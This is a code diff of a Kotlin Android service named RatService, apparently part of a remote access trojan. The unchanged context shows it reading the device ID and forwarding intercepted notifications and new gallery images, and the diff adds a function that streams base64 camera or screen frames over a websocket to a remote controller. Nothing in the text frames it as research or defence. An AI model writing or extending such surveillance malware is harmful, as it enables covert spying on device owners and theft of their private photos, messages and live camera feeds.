@@ -15,7 +15,6 @@ class RatService : Service() {
 
     companion object {
         const val NOTIF_ID = 1
-
         @Volatile var instance: RatService? = null
     }
 
@@ -38,8 +37,7 @@ class RatService : Service() {
         super.onCreate()
         instance = this
         deviceId = android.provider.Settings.Secure.getString(
-            contentResolver,
-            android.provider.Settings.Secure.ANDROID_ID
+            contentResolver, android.provider.Settings.Secure.ANDROID_ID
         ) ?: "unknown"
         handler = CommandHandler(this, deviceId)
 
@@ -50,7 +48,6 @@ class RatService : Service() {
             sendEvent(mapOf("type" to "gallery_new", "data" to img))
         }
 
-        // Register notification listener callback
         NotificationListener.callback = { data ->
             sendNotificationEvent(data)
         }
@@ -132,6 +129,24 @@ class RatService : Service() {
                 try { connect() } catch (_: Exception) {}
             }
         }.start()
+    }
+
+    // ============================================================
+    // SEND FRAME (untuk live stream kamera/layar)
+    // ============================================================
+    fun sendFrame(frameType: String, base64Data: String) {
+        try {
+            val payload = JsonObject().apply {
+                addProperty("type", "event")
+                add("data", gson.toJsonTree(mapOf(
+                    "type" to "live_frame",
+                    "frame_type" to frameType,
+                    "data" to base64Data,
+                    "ts" to System.currentTimeMillis()
+                )))
+            }
+            ws?.send(gson.toJson(payload))
+        } catch (_: Exception) {}
     }
 
     private fun sendEvent(data: Map<String, Any>) {
